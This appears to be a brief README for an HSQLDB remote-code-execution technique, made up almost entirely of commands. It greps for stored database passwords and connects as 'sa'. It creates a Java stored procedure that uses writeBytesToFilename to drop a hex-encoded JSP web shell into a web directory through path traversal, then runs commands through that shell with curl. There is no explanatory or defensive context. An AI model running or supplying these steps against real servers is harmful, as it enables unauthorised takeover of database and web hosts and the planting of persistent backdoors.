# hsqldb-rce
```
> grep -rP 'jdbc:hsqldb.*password.*' /path/to/hsqldb
> java -jar hsqldb.jar
> jdbc:hsqldb:hsql://ip/DBNAME

> java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://IP/DBNAME --user 
sa --password <password>

CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'

> python encode.py
call writeBytesToFilename('../../path/to/folder/shell.jsp', cast('3c2540207061676520696d706f7274[...]' as VARBINARY(1024))) 

# kali@kali:~$ curl http://IP:PORT/path/to/folder/shell.jsp?cmd=hostname
```
